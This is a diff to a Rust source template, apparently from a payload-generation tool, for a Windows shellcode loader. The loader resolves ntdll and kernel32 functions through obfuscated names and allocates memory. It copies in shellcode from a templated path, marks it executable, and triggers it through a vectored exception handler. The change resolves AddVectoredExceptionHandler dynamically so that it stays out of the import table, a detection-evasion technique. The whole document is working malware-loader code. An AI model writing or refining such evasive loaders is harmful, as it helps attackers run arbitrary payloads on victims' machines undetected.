@@ -10,9 +10,8 @@ use std::ptr::null_mut;
 
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE, EXCEPTION_CONTINUE_EXECUTION},
+        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE},
         libloaderapi::{GetModuleHandleA, GetProcAddress},
-        errhandlingapi::AddVectoredExceptionHandler,
     },
     shared::{
         ntdef::{NT_SUCCESS, HANDLE},
@@ -32,10 +31,15 @@ const OBF_NT_ALLOCATE_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}
 const OBF_NT_WRITE_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
 const OBF_NT_PROTECT_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
 const OBF_NT_RAISE_EXCEPTION: &[u8] = &{{OBF_NT_RAISE_EXCEPTION}};
+const OBF_ADD_VECTORED_EXCEPTION_HANDLER: &[u8] = &{{OBF_ADD_VECTORED_EXCEPTION_HANDLER}};
 
 // Global to hold shellcode address for the VEH handler
 static mut SHELLCODE_ADDR: *const u8 = null_mut();
 
+// Windows exception constant
+const EXCEPTION_CONTINUTE_EXECUTION: i32 = 0x00000001;
+
+// Use raw pointer for the exception handler
 extern "system" fn veh_handler(_exception_info: *mut c_void) -> i32 {
     unsafe {
         if !SHELLCODE_ADDR.is_null() {
@@ -43,7 +47,7 @@ extern "system" fn veh_handler(_exception_info: *mut c_void) -> i32 {
             shellcode_fn();
         }
     }
-    EXCEPTION_CONTINUE_EXECUTION
+    EXCEPTION_CONTINUTE_EXECUTION
 }
 
 fn r(d: &[u8]) -> Vec<u8> {
@@ -53,6 +57,14 @@ fn r(d: &[u8]) -> Vec<u8> {
 unsafe fn g(n: &[u8]) -> *const () {
     let ntdll = CString::new(lc!("ntdll")).unwrap();
     let h = GetModuleHandleA(ntdll.as_ptr());
+    let s = r(n);
+    let c = CString::new(s).unwrap();
+    GetProcAddress(h, c.as_ptr()) as *const ()
+}
+
+unsafe fn kernel32_g(n: &[u8]) -> *const () {
+    let kernel32 = CString::new(lc!("kernel32")).unwrap();
+    let h = GetModuleHandleA(kernel32.as_ptr());
     let s = r(n);
     let c = CString::new(s).unwrap();
     GetProcAddress(h, c.as_ptr()) as *const ()
@@ -85,6 +97,10 @@ type FnNtRaiseException = unsafe extern "system" fn(
     *mut c_void,
     u32,
 ) -> i32;
+type FnAddVectoredExceptionHandler = unsafe extern "system" fn(
+    i32,
+    Option<extern "system" fn(*mut c_void) -> i32>,
+) -> *mut c_void;
 
 fn allocate_rw_memory(size: usize) -> Option<*mut c_void> {
     let current_process: HANDLE = -1isize as HANDLE;
@@ -131,7 +147,7 @@ fn write_to_memory(destination: *mut c_void, source: &[u8]) -> bool {
     }
 }
 
-fn change_protection_to_rx(address: *mut c_void, size: usize) -> bool {
+fn change_protection_to_rx(mut address: *mut c_void, size: usize) -> bool {
     let current_process: HANDLE = -1isize as HANDLE;
 
     unsafe {
@@ -153,7 +169,9 @@ fn change_protection_to_rx(address: *mut c_void, size: usize) -> bool {
 }
 
 unsafe fn register_veh_handler() -> bool {
-    let result = AddVectoredExceptionHandler(1, Some(veh_handler));
+    let f_add_veh: FnAddVectoredExceptionHandler = std::mem::transmute(kernel32_g(OBF_ADD_VECTORED_EXCEPTION_HANDLER));
+    
+    let result = f_add_veh(1, Some(veh_handler));
     !result.is_null()
 }
 
@@ -209,7 +227,7 @@ fn main() {
     }
 
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
-    let vec: Vec<u8> = buf.to_vec();
+    let mut vec: Vec<u8> = buf.to_vec();
 
     {{MAIN}}
 
